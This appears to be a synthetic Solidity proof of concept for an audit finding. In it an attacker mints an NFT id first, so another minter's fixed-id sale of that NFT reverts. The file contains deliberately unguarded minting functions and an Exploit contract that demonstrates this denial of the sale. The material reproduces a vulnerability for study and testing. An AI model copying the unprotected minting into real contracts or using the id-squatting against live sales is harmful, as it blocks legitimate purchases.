// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Vibe NFTMintSaleMultiple — a shared mintWithId range can be occupied
    (MixBytes, AuditVault 27820).
    SYNTHETIC, cheatcode-free. buyNFT calls
    `nft.mintWithId(recipient, id)` (NFTMintSaleMultiple.sol L77).
    Another minter of the same ERC721 can take that id first.
    The sale of that id then reverts. Price is 1 ETH. The control
    restricts mintWithId to the sale, and the buyer receives the NFT. */

contract VibeERC721 {
    address public minter;
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    function setMinter(address minter_) external {
        minter = minter_;
    }

    function mintWithId(address recipient, uint256 id) external {
        if (minter != address(0)) {
            require(msg.sender == minter, "minter");
        }
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = recipient;
        balanceOf[recipient] += 1;
    }
}

contract NFTMintSaleMultiple {
    VibeERC721 public nft;
    uint256 public id;
    uint256 public price;
    uint256 public sold;
    uint256 public collected;

    constructor(VibeERC721 nft_, uint256 id_, uint256 price_) {
        nft = nft_;
        id = id_;
        price = price_;
    }

    function buyNFT(address recipient) external payable {
        require(msg.value == price, "price");
        uint256 tokenId = id;
        // @> VULN: mintWithId reverts when another minter already took this id.
        nft.mintWithId(recipient, tokenId);
        sold += 1;
        collected += msg.value;
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 7;
    uint256 public constant PRICE = 1 ether;

    VibeERC721 public nft;
    NFTMintSaleMultiple public sale;
    uint256 public unsoldWei;
    bool public buyReverted;

    constructor() {
        nft = new VibeERC721();
        sale = new NFTMintSaleMultiple(nft, TOKEN_ID, PRICE);
    }

    function run() external payable {
        require(msg.value == PRICE, "1 eth");
        nft.mintWithId(address(this), TOKEN_ID);
        require(nft.ownerOf(TOKEN_ID) == address(this), "attacker owns id");
        try sale.buyNFT{value: PRICE}(address(0xB0B)) {
            revert("sale should revert");
        } catch {
            buyReverted = true;
        }
        unsoldWei = PRICE;
        require(buyReverted, "buy reverted");
        require(sale.sold() == 0, "none sold");
        require(sale.collected() == 0, "collected 0");
        require(nft.balanceOf(address(0xB0B)) == 0, "buyer has none");
        require(address(sale).balance == 0, "sale holds 0");
        (bool ok,) = address(0xB0B).call{value: address(this).balance}("");
        require(ok, "refund");
        require(address(this).balance == 0, "no leftover");
        require(address(0xB0B).balance == PRICE, "buyer refunded");
    }
}
